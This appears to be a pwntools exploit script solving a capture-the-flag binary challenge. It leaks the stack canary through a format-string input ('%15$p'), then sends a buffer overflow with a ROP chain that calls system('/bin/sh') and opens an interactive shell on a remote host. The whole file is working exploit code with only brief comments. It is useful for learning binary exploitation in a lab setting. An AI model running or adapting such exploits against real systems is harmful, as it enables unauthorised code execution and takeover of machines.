import pwn

# Load local binary metadata to pull system and string addresses automatically
elf = pwn.ELF('./chal')

# Static ROP component locations from your objdump
pop_rdi = 0x40122e
ret_padding = 0x40122f

# Automatically resolve system and /bin/sh addresses
system_plt = elf.plt['system']
bin_sh_addr = next(elf.search(b'/bin/sh'))

io = pwn.remote('10.21.232.223', 41750)

# 1. Request the canary leak via the format string vulnerability
io.sendlineafter(b"What is your name?", b"%15$p")

# Parse the leaked hex string back into an integer value
io.recvuntil(b"Hello ")
leaked_canary = int(io.recvline().strip(), 16)
print(f"[+] Leaked Stack Canary: {hex(leaked_canary)}")

# 2. Build the ROP chain payload for the gets() prompt
# Buffer size to canary is 40 bytes (0x30 - 0x8 = 40)
payload = b"A" * 40
payload += pwn.p64(leaked_canary)   # Put the correct canary back intact
payload += b"B" * 8                 # Overwrite saved RBP frame pointer (8 bytes)

# Construct ROP sequence
payload += pwn.p64(ret_padding)     # Stack alignment fix for system()
payload += pwn.p64(pop_rdi)         # Pop /bin/sh into RDI register
payload += pwn.p64(bin_sh_addr)     # Pointer to "/bin/sh" string
payload += pwn.p64(system_plt)      # Call system("/bin/sh")

# Send the payload to execute our control flow hijack
io.sendlineafter(b"Retype name for confirmation", payload)

# Link terminal to shell interaction session
io.interactive()
